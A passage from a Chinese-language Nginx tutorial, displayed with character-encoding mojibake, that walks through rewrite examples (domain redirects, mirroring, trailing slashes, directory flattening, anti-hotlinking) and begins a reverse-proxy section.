demo_success;<br>&#125;<br></code></pre></td></tr></table></figure><p>è®¿é—®<code>http://192.168.200.133:8081/rewrite/testabc</code>è¯·æ±‚ä¼šè¢«æ°¸ä¹…é‡å®šå‘ï¼Œæµè§ˆå™¨åœ°å€ä¹Ÿä¼šå‘ç”Ÿæ”¹å˜</p><h4 id="rewrite_logæŒ‡ä»¤"><a class="markdownIt-Anchor" href="#rewrite_logæŒ‡ä»¤"></a> rewrite_logæŒ‡ä»¤</h4><p>è¯¥æŒ‡ä»¤é…ç½®æ˜¯å¦å¼€å¯URLé‡å†™æ—¥å¿—çš„è¾“å‡ºåŠŸèƒ½ã€‚</p><table><thead><tr><th>è¯­æ³•</th><th>rewrite_log on|off;</th></tr></thead><tbody><tr><td>é»˜è®¤å€¼</td><td>rewrite_log off;</td></tr><tr><td>ä½ç½®</td><td>httpã€serverã€locationã€if</td></tr></tbody></table><p>å¼€å¯åï¼ŒURLé‡å†™çš„ç›¸å…³æ—¥å¿—å°†ä»¥noticeçº§åˆ«è¾“å‡ºåˆ°error_logæŒ‡ä»¤é…ç½®çš„æ—¥å¿—æ–‡ä»¶æ±‡æ€»ã€‚</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">rewrite_log</span> <span class="hljs-literal">on</span>;<br><span class="hljs-attribute">error_log</span>  logs/<span class="hljs-literal">error</span>.log <span class="hljs-literal">notice</span>;<br></code></pre></td></tr></table></figure><h3 id="rewriteçš„æ¡ˆä¾‹"><a class="markdownIt-Anchor" href="#rewriteçš„æ¡ˆä¾‹"></a> Rewriteçš„æ¡ˆä¾‹</h3><h4 id="åŸŸåè·³è½¬"><a class="markdownIt-Anchor" href="#åŸŸåè·³è½¬"></a> åŸŸåè·³è½¬</h4><blockquote><p>é—®é¢˜åˆ†æ</p></blockquote><p>å…ˆæ¥çœ‹ä¸€ä¸ªæ•ˆæœï¼Œå¦‚æœæˆ‘ä»¬æƒ³è®¿é—®äº¬ä¸œç½‘ç«™ï¼Œå¤§å®¶éƒ½çŸ¥é“æˆ‘ä»¬å¯ä»¥è¾“å…¥<code>www.jd.com</code>,ä½†æ˜¯åŒæ ·çš„æˆ‘ä»¬ä¹Ÿå¯ä»¥è¾“å…¥<code>www.360buy.com</code>åŒæ ·ä¹Ÿéƒ½èƒ½è®¿é—®åˆ°äº¬ä¸œç½‘ç«™ã€‚<a href="http://xn--www-w48dncyev1bq7fw6d70b44jz5j4kd0qj8rhqpcd0trr5az4ama9098f7p5f.360buy.com">è¿™ä¸ªå…¶å®æ˜¯å› ä¸ºäº¬ä¸œåˆšå¼€å§‹çš„æ—¶å€™åŸŸåå°±æ˜¯www.360buy.com</a>ï¼Œ<a href="http://xn--www-0h9dlb801dguajcf733ef2c1t1a6tmysbxwf4x7h3yen6qvr1bmz3g.jd.com">åé¢ç”±äºå„ç§åŸå› æŠŠè‡ªå·±çš„åŸŸåæ¢æˆäº†www.jd.com</a>, è™½ç„¶è¯´åŸŸåå˜é‡ï¼Œä½†æ˜¯å¯¹äºä»¥å‰åªè®°ä½äº†www.360buy.comçš„ç”¨æˆ·æ¥è¯´ï¼Œæˆ‘ä»¬å¦‚ä½•æŠŠè¿™éƒ¨åˆ†ç”¨æˆ·ä¹Ÿè¿ç§»åˆ°æˆ‘ä»¬æ–°åŸŸåçš„è®¿é—®ä¸Šæ¥ï¼Œé’ˆå¯¹äºè¿™ä¸ªé—®é¢˜ï¼Œæˆ‘ä»¬å°±å¯ä»¥ä½¿ç”¨Nginxä¸­Rewriteçš„åŸŸåè·³è½¬æ¥è§£å†³ã€‚</p><blockquote><p>ç¯å¢ƒå‡†å¤‡</p></blockquote><ul><li>å‡†å¤‡ä¸‰ä¸ªåŸŸåï¼š</li></ul><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">vim <span class="hljs-regexp">/etc/</span>hosts<br></code></pre></td></tr></table></figure><figure class="highlight accesslog"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs accesslog"><span class="hljs-number">127.0.0.1</span>   www.itcast.cn<br><span class="hljs-number">127.0.0.1</span>   www.itheima.cn<br><span class="hljs-number">127.0.0.1</span>   www.itheima.com<br></code></pre></td></tr></table></figure><ul><li><a href="http://xn--Nginxwww-jn5ou93qyk1cvdk24ac11d.itcast.cn">é€šè¿‡Nginxå®ç°è®¿é—®www.itcast.cn</a></li></ul><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> www.itcast.cn;<br><span class="hljs-section">location</span> /&#123;<br><span class="hljs-attribute">default_type</span> text/html;<br><span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;welcome to itcast&lt;/h1&gt;&#x27;</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p><a href="http://xn--Rewritewww-uk3sy9bh26b7i0mt9a.ithema.xn--comwww-k76j.itheima.xn--cnwww-8o6hh17mhfr897bgferwe.itcast.com">é€šè¿‡Rewriteå®Œæˆå°†www.ithema.comå’Œwww.itheima.cnçš„è¯·æ±‚è·³è½¬åˆ°www.itcast.com</a></p></blockquote><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> www.itheima.com www.itheima.cn;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/</span> http://www.itcast.cn;<br>&#125;<br></code></pre></td></tr></table></figure><p>é—®é¢˜æè¿°:å¦‚ä½•åœ¨åŸŸåè·³è½¬çš„è¿‡ç¨‹ä¸­æºå¸¦è¯·æ±‚çš„URIï¼Ÿ</p><p>ä¿®æ”¹é…ç½®ä¿¡æ¯</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> www.itheima.com www.itheima.cn;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^(.*)</span> http://www.itcast.cn<span class="hljs-variable">$1</span>ï¼›<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åŸŸåé•œåƒ"><a class="markdownIt-Anchor" href="#åŸŸåé•œåƒ"></a> åŸŸåé•œåƒ</h4><p>é•œåƒç½‘ç«™æŒ‡å®šæ˜¯å°†ä¸€ä¸ªå®Œå…¨ç›¸åŒçš„ç½‘ç«™åˆ†åˆ«æ”¾ç½®åˆ°å‡ å°æœåŠ¡å™¨ä¸Šï¼Œå¹¶åˆ†åˆ«ä½¿ç”¨ç‹¬ç«‹çš„URLè¿›è¡Œè®¿é—®ã€‚å…¶ä¸­ä¸€å°æœåŠ¡å™¨ä¸Šçš„ç½‘ç«™å«ä¸»ç«™ï¼Œå…¶ä»–çš„ä¸ºé•œåƒç½‘ç«™ã€‚é•œåƒç½‘ç«™å’Œä¸»ç«™æ²¡æœ‰å¤ªå¤§çš„åŒºåˆ«ï¼Œå¯ä»¥æŠŠé•œåƒç½‘ç«™ç†è§£ä¸ºä¸»ç«™çš„ä¸€ä¸ªå¤‡ä»½èŠ‚ç‚¹ã€‚å¯ä»¥é€šè¿‡é•œåƒç½‘ç«™æä¾›ç½‘ç«™åœ¨ä¸åŒåœ°åŒºçš„å“åº”é€Ÿåº¦ã€‚é•œåƒç½‘ç«™å¯ä»¥å¹³è¡¡ç½‘ç«™çš„æµé‡è´Ÿè½½ã€å¯ä»¥è§£å†³ç½‘ç»œå®½å¸¦é™åˆ¶ã€å°é”ç­‰ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1589560433192.png" alt="1589560433192" /></p><p>è€Œæˆ‘ä»¬æ‰€è¯´çš„åŸŸåé•œåƒå’Œç½‘ç«™é•œåƒæ¯”è¾ƒç±»ä¼¼ï¼Œä¸Šè¿°æ¡ˆä¾‹ä¸­ï¼Œå°†www.itheima.comå’Œ <a href="http://www.itheima.xn--cnwww-8o6hq90zoxva74cr8e.itcast.cn">www.itheima.cnéƒ½èƒ½è·³è½¬åˆ°www.itcast.cn</a>ï¼Œé‚£ä¹ˆwww.itcast.cnæˆ‘ä»¬å°±å¯ä»¥æŠŠå®ƒèµ·åå«ä¸»åŸŸåï¼Œå…¶ä»–ä¸¤ä¸ªå°±æ˜¯æˆ‘ä»¬æ‰€è¯´çš„é•œåƒåŸŸåï¼Œå½“ç„¶å¦‚æœæˆ‘ä»¬ä¸æƒ³æŠŠæ•´ä¸ªç½‘ç«™åšé•œåƒï¼Œåªæƒ³ä¸ºå…¶ä¸­æŸä¸€ä¸ªå­ç›®å½•ä¸‹çš„èµ„æºåšé•œåƒï¼Œæˆ‘ä»¬å¯ä»¥åœ¨locationå—ä¸­é…ç½®rewriteåŠŸèƒ½ï¼Œæ¯”å¦‚:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br>    <span class="hljs-attribute">listen</span>          <span class="hljs-number">80</span>;<br>    <span class="hljs-attribute">server_name</span>     www.itheima.cn www.itheima.com;<br>    <span class="hljs-section">location</span> /user &#123;<br>    <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/user(.*)$</span> http://www.itcast.cn<span class="hljs-variable">$1</span>;<br>    &#125;<br>    <span class="hljs-section">location</span> /emp&#123;<br>        <span class="hljs-attribute">default_type</span> text/html;<br>        <span class="hljs-attribute">return</span> <span class="hljs-number">200</span> <span class="hljs-string">&#x27;&lt;h1&gt;emp_success&lt;/h1&gt;&#x27;</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h4 id="ç‹¬ç«‹åŸŸå"><a class="markdownIt-Anchor" href="#ç‹¬ç«‹åŸŸå"></a> ç‹¬ç«‹åŸŸå</h4><p>ä¸€ä¸ªå®Œæ•´çš„é¡¹ç›®åŒ…å«å¤šä¸ªæ¨¡å—ï¼Œæ¯”å¦‚è´­ç‰©ç½‘ç«™æœ‰å•†å“æœç´¢æ¨¡å—ã€å•†å“è¯¦æƒ…æ¨¡å—å’Œè´­ç‰©è½¦æ¨¡å—ç­‰ï¼Œé‚£ä¹ˆæˆ‘ä»¬å¦‚ä½•ä¸ºæ¯ä¸€ä¸ªæ¨¡å—è®¾ç½®ç‹¬ç«‹çš„åŸŸåã€‚</p><p>éœ€æ±‚ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>search.itcast.com:<span class="hljs-number">81</span>  è®¿é—®å•†å“æœç´¢æ¨¡å—<br>http:<span class="hljs-regexp">//i</span>tem.itcast.com:<span class="hljs-number">82</span>  è®¿é—®å•†å“è¯¦æƒ…æ¨¡å—<br>http:<span class="hljs-regexp">//</span>cart.itcast.com:<span class="hljs-number">83</span>  è®¿é—®å•†å“è´­ç‰©è½¦æ¨¡å—<br></code></pre></td></tr></table></figure><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">server&#123;<br><span class="hljs-attribute">listen 81;</span><br><span class="hljs-attribute">server_name search.itcast.com;</span><br><span class="hljs-attribute">rewrite ^(.*) http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>/search$1;<br>&#125;<br>server&#123;<br><span class="hljs-attribute">listen 82;</span><br><span class="hljs-attribute">server_name item.itcast.com;</span><br><span class="hljs-attribute">rewrite ^(.*) http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>/item$1;<br>&#125;<br>server&#123;<br><span class="hljs-attribute">listen 83;</span><br><span class="hljs-attribute">server_name cart.itcast.com;</span><br><span class="hljs-attribute">rewrite ^(.*) http</span>://www<span class="hljs-variable">.itcast</span><span class="hljs-variable">.cn</span>/cart$1;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="ç›®å½•è‡ªåŠ¨æ·»åŠ "><a class="markdownIt-Anchor" href="#ç›®å½•è‡ªåŠ¨æ·»åŠ "></a> ç›®å½•è‡ªåŠ¨æ·»åŠ &quot;/&quot;</h4><p>é—®é¢˜æè¿°</p><p>é€šè¿‡ä¸€ä¸ªä¾‹å­æ¥æ¼”ç¤ºä¸‹é—®é¢˜:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">8082</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /heima &#123;<br><span class="hljs-attribute">root</span> html;<br><span class="hljs-attribute">index</span> index.html;<br>&#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><p>é€šè¿‡<code>http://192.168.200.133:8082/heima</code>å’Œé€šè¿‡<code>http://192.168.200.133:8082/heima/</code>è®¿é—®çš„åŒºåˆ«ï¼Ÿ</p><p>å¦‚æœä¸åŠ æ–œæ ï¼ŒNginxæœåŠ¡å™¨å†…éƒ¨ä¼šè‡ªåŠ¨åšä¸€ä¸ª301çš„é‡å®šå‘ï¼Œé‡å®šå‘çš„åœ°å€ä¼šæœ‰ä¸€ä¸ªæŒ‡ä»¤å«server_name_in_redirect on|off;æ¥å†³å®šé‡å®šå‘çš„åœ°å€ï¼š</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">å¦‚æœè¯¥æŒ‡ä»¤ä¸ºon<br>é‡å®šå‘çš„åœ°å€ä¸º:  http:<span class="hljs-regexp">//</span>server_name:<span class="hljs-number">8082</span><span class="hljs-regexp">/ç›®å½•å/</span>;<br>http:<span class="hljs-regexp">//</span>localhost:<span class="hljs-number">8082</span><span class="hljs-regexp">/heima/</span><br>å¦‚æœè¯¥æŒ‡ä»¤ä¸ºoff<br>é‡å®šå‘çš„åœ°å€ä¸º:  http:<span class="hljs-regexp">//</span>åŸURLä¸­çš„åŸŸå:<span class="hljs-number">8082</span><span class="hljs-regexp">/ç›®å½•å/</span>;<br>http:<span class="hljs-regexp">//</span><span class="hljs-number">192.168</span>.<span class="hljs-number">200.133</span>:<span class="hljs-number">8082</span><span class="hljs-regexp">/heima/</span><br></code></pre></td></tr></table></figure><p>æ‰€ä»¥å°±æ‹¿åˆšæ‰çš„åœ°å€æ¥è¯´ï¼Œ<a href="http://192.168.200.133:8082/heima%E5%A6%82%E6%9E%9C%E4%B8%8D%E5%8A%A0%E6%96%9C%E6%9D%A0%EF%BC%8C%E9%82%A3%E4%B9%88%E6%8C%89%E7%85%A7%E4%B8%8A%E8%BF%B0%E8%A7%84%E5%88%99%EF%BC%8C%E5%A6%82%E6%9E%9C%E6%8C%87%E4%BB%A4server_name_in_redirect%E4%B8%BAon%EF%BC%8C%E5%88%99301%E9%87%8D%E5%AE%9A%E5%90%91%E5%9C%B0%E5%9D%80%E5%8F%98%E4%B8%BA">http://192.168.200.133:8082/heimaå¦‚æœä¸åŠ æ–œæ ï¼Œé‚£ä¹ˆæŒ‰ç…§ä¸Šè¿°è§„åˆ™ï¼Œå¦‚æœæŒ‡ä»¤server_name_in_redirectä¸ºonï¼Œåˆ™301é‡å®šå‘åœ°å€å˜ä¸º</a> <a href="http://localhost:8082/heima/,%E5%A6%82%E6%9E%9C%E4%B8%BAoff%EF%BC%8C%E5%88%99301%E9%87%8D%E5%AE%9A%E5%90%91%E5%9C%B0%E5%9D%80%E5%8F%98%E4%B8%BAhttp://192.168.200.133:8082/heima/%E3%80%82%E5%90%8E%E9%9D%A2%E8%BF%99%E4%B8%AA%E6%98%AF%E6%AD%A3%E5%B8%B8%E7%9A%84%EF%BC%8C%E5%89%8D%E9%9D%A2%E5%9C%B0%E5%9D%80%E5%B0%B1%E6%9C%89%E9%97%AE%E9%A2%98%E3%80%82">http://localhost:8082/heima/,å¦‚æœä¸ºoffï¼Œåˆ™301é‡å®šå‘åœ°å€å˜ä¸ºhttp://192.168.200.133:8082/heima/ã€‚åé¢è¿™ä¸ªæ˜¯æ­£å¸¸çš„ï¼Œå‰é¢åœ°å€å°±æœ‰é—®é¢˜ã€‚</a></p><p>æ³¨æ„server_name_in_redirectæŒ‡ä»¤åœ¨Nginxçš„0.8.48ç‰ˆæœ¬ä¹‹å‰é»˜è®¤éƒ½æ˜¯onï¼Œä¹‹åæ”¹æˆäº†off,æ‰€ä»¥ç°åœ¨æˆ‘ä»¬è¿™ä¸ªç‰ˆæœ¬ä¸éœ€è¦è€ƒè™‘è¿™ä¸ªé—®é¢˜ï¼Œä½†æ˜¯å¦‚æœæ˜¯0.8.48ä»¥å‰çš„ç‰ˆæœ¬å¹¶ä¸”server_name_in_redirectè®¾ç½®ä¸ºonï¼Œæˆ‘ä»¬å¦‚ä½•é€šè¿‡rewriteæ¥è§£å†³è¿™ä¸ªé—®é¢˜ï¼Ÿ</p><p>è§£å†³æ–¹æ¡ˆ</p><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨rewriteåŠŸèƒ½ä¸ºæœ«å°¾æ²¡æœ‰æ–œæ çš„URLè‡ªåŠ¨æ·»åŠ ä¸€ä¸ªæ–œæ </p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span><span class="hljs-number">80</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-attribute">server_name_in_redirect</span> <span class="hljs-literal">on</span>;<br><span class="hljs-section">location</span> /heima &#123;<br><span class="hljs-attribute">if</span> (-d <span class="hljs-variable">$request_filename</span>)&#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/(.*)([^/])$</span> http://<span class="hljs-variable">$host</span>/<span class="hljs-variable">$1</span><span class="hljs-variable">$2</span>/ <span class="hljs-literal">permanent</span>;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><h4 id="åˆå¹¶ç›®å½•"><a class="markdownIt-Anchor" href="#åˆå¹¶ç›®å½•"></a> åˆå¹¶ç›®å½•</h4><p>æœç´¢å¼•æ“ä¼˜åŒ–(SEO)æ˜¯ä¸€ç§åˆ©ç”¨æœç´¢å¼•æ“çš„æœç´¢è§„åˆ™æ¥æé«˜ç›®çš„ç½‘ç«™åœ¨æœ‰å…³æœç´¢å¼•æ“å†…æ’åçš„æ–¹å¼ã€‚æˆ‘ä»¬åœ¨åˆ›å»ºè‡ªå·±çš„ç«™ç‚¹æ—¶ï¼Œå¯ä»¥é€šè¿‡å¾ˆå¤šä¸­æ–¹å¼æ¥æœ‰æ•ˆçš„æä¾›æœç´¢å¼•æ“ä¼˜åŒ–çš„ç¨‹åº¦ã€‚å…¶ä¸­æœ‰ä¸€é¡¹å°±åŒ…å«URLçš„ç›®å½•å±‚çº§ä¸€èˆ¬ä¸è¦è¶…è¿‡ä¸‰å±‚ï¼Œå¦åˆ™çš„è¯ä¸åˆ©äºæœç´¢å¼•æ“çš„æœç´¢ä¹Ÿç»™å®¢æˆ·ç«¯çš„è¾“å…¥å¸¦æ¥äº†è´Ÿæ‹…ï¼Œä½†æ˜¯å°†æ‰€æœ‰çš„æ–‡ä»¶æ”¾åœ¨ä¸€ä¸ªç›®å½•ä¸‹åˆä¼šå¯¼è‡´æ–‡ä»¶èµ„æºç®¡ç†æ··ä¹±å¹¶ä¸”è®¿é—®æ–‡ä»¶çš„é€Ÿåº¦ä¹Ÿä¼šéšç€æ–‡ä»¶å¢å¤šè€Œæ…¢ä¸‹æ¥ï¼Œè¿™ä¸¤ä¸ªé—®é¢˜æ˜¯ç›¸äº’çŸ›ç›¾çš„ï¼Œé‚£ä¹ˆä½¿ç”¨rewriteå¦‚ä½•è§£å†³ä¸Šè¿°é—®é¢˜?</p><p>ä¸¾ä¾‹ï¼Œç½‘ç«™ä¸­æœ‰ä¸€ä¸ªèµ„æºæ–‡ä»¶çš„è®¿é—®è·¯å¾„æ—¶ /server/11/22/33/44/20.html,ä¹Ÿå°±æ˜¯è¯´20.htmlå­˜åœ¨äºç¬¬5çº§ç›®å½•ä¸‹ï¼Œå¦‚æœæƒ³è¦è®¿é—®è¯¥èµ„æºæ–‡ä»¶ï¼Œå®¢æˆ·ç«¯çš„URLåœ°å€å°±è¦å†™æˆ <code>http://192.168.200.133/server/11/22/33/44/20.html</code>,</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /server&#123;<br><span class="hljs-attribute">root</span> html;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>ä½†æ˜¯è¿™ä¸ªæ˜¯éå¸¸ä¸åˆ©äºSEOæœç´¢å¼•æ“ä¼˜åŒ–çš„ï¼ŒåŒæ—¶å®¢æˆ·ç«¯ä¹Ÿä¸å¥½è®°.ä½¿ç”¨rewriteæˆ‘ä»¬å¯ä»¥è¿›è¡Œå¦‚ä¸‹é…ç½®:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">server</span> &#123;<br><span class="hljs-attribute">listen</span> <span class="hljs-number">8083</span>;<br><span class="hljs-attribute">server_name</span> localhost;<br><span class="hljs-section">location</span> /server&#123;<br><span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/server-([0-9]+)-([0-9]+)-([0-9]+)-([0-9]+)\.html$</span> /server/<span class="hljs-variable">$1</span>/<span class="hljs-variable">$2</span>/<span class="hljs-variable">$3</span>/<span class="hljs-variable">$4</span>/<span class="hljs-variable">$5</span>.html <span class="hljs-literal">last</span>;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>è¿™æ ·çš„èŠ±ï¼Œå®¢æˆ·ç«¯åªéœ€è¦è¾“å…¥http://www.web.name/server-11-22-33-44-20.htmlå°±å¯ä»¥è®¿é—®åˆ°20.htmlé¡µé¢äº†ã€‚è¿™é‡Œä¹Ÿå……åˆ†åˆ©ç”¨äº†rewriteæŒ‡ä»¤æ”¯æŒæ­£åˆ™è¡¨è¾¾å¼çš„ç‰¹æ€§ã€‚</p><h4 id="é˜²ç›—é“¾"><a class="markdownIt-Anchor" href="#é˜²ç›—é“¾"></a> é˜²ç›—é“¾</h4><p>é˜²ç›—é“¾ä¹‹å‰æˆ‘ä»¬å·²ç»ä»‹ç»è¿‡äº†ç›¸å…³çš„çŸ¥è¯†ï¼Œåœ¨rewriteä¸­çš„é˜²ç›—é“¾å’Œä¹‹å‰å°†çš„åŸç†å…¶å®éƒ½æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡é€šè¿‡rewriteå¯ä»¥å°†é˜²ç›—é“¾çš„åŠŸèƒ½è¿›è¡Œå®Œå–„ä¸‹ï¼Œå½“å‡ºç°é˜²ç›—é“¾çš„æƒ…å†µï¼Œæˆ‘ä»¬å¯ä»¥ä½¿ç”¨rewriteå°†è¯·æ±‚è½¬å‘åˆ°è‡ªå®šä¹‰çš„ä¸€å¼ å›¾ç‰‡å’Œé¡µé¢ï¼Œç»™ç”¨æˆ·æ¯”è¾ƒå¥½çš„æç¤ºä¿¡æ¯ã€‚ä¸‹é¢æˆ‘ä»¬å°±é€šè¿‡æ ¹æ®æ–‡ä»¶ç±»å‹å®ç°é˜²ç›—é“¾çš„ä¸€ä¸ªé…ç½®å®ä¾‹:</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-section">location</span> /images &#123;<br>    <span class="hljs-attribute">root</span> html;<br>    <span class="hljs-attribute">valid_referers</span> <span class="hljs-literal">none</span> <span class="hljs-literal">blocked</span> www.baidu.com;<br>    <span class="hljs-attribute">if</span> (<span class="hljs-variable">$invalid_referer</span>)&#123;<br>        <span class="hljs-comment">#return 403;</span><br>        <span class="hljs-attribute">rewrite</span><span class="hljs-regexp"> ^/</span>    /images/forbidden.png <span class="hljs-literal">break</span>;<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="nginxåå‘ä»£ç†"><a class="markdownIt-Anchor" href="#nginxåå‘ä»£ç†"></a> Nginxåå‘ä»£ç†</h1><h2 id="nginxåå‘ä»£ç†æ¦‚è¿°"><a class="markdownIt-Anchor" href="#nginxåå‘ä»£ç†æ¦‚è¿°"></a> Nginxåå‘ä»£ç†æ¦‚è¿°</h2><p>å…³äºæ­£å‘ä»£ç†å’Œåå‘ä»£ç†ï¼Œæˆ‘ä»¬åœ¨å‰é¢çš„ç« èŠ‚å·²ç»é€šè¿‡ä¸€å¼ å›¾ç»™å¤§å®¶è¯¦ç»†çš„ä»‹ç»è¿‡äº†ï¼Œç®€è€Œè¨€ä¹‹å°±æ˜¯æ­£å‘ä»£ç†ä»£ç†çš„å¯¹è±¡æ˜¯å®¢æˆ·ç«¯ï¼Œåå‘ä»£ç†ä»£ç†çš„æ˜¯æœåŠ¡ç«¯ï¼Œè¿™æ˜¯ä¸¤è€…ä¹‹é—´æœ€å¤§çš„åŒºåˆ«ã€‚</p><p>Nginxå³å¯ä»¥å®ç°æ­£å‘ä»£ç†ï¼Œä¹Ÿå¯ä»¥å®ç°åå‘ä»£ç†ã€‚</p><p>æˆ‘ä»¬å…ˆæ¥é€šè¿‡ä¸€ä¸ªå°æ¡ˆä¾‹æ¼”ç¤ºä¸‹Nginxæ­£å‘ä»£ç†çš„ç®€å•åº”ç”¨ã€‚</p><p>å…ˆæéœ€æ±‚ï¼š</p><p><img src="F:%5C%E7%99%BE%E5%BA%A6%E7%BD%91%E7%9B%98%5CNginx%E7%AC%94%E8%AE%B0%5Cassets%5C1581846370052.png" alt="" /></p><p>(1)æœåŠ¡ç«¯çš„è®¾ç½®ï¼š</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">http &#123;<br>  log_format main <span class="hljs-string">&#x27;client send request=&gt;clientIp=$remote_addr serverIp=&gt;$host&#x27;</span>;<br><span class="hljs-keyword">server</span>&#123;<br><span class="hljs-keyword">listen</span> <span class="hljs-number">80</span>;<br>server_namelocalhost;<br>access_log logs/<span class="hljs-keyword">access</span>.<span class="hljs-keyword">log</span> main;<br><span class="hljs-keyword">location</span> &#123;<br>root html;<br><span class="hljs-keyword">index</span> <span class="hljs-keyword">index</span>.html <span class="hljs-keyword">index</span>.htm;<br>&#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>(2)ä½¿ç”¨å®¢æˆ·ç«¯è®¿é—®æœåŠ¡ç«¯ï¼Œæ‰“å¼€æ—¥å¿—æŸ¥çœ‹ç»“æœ</p><p><img 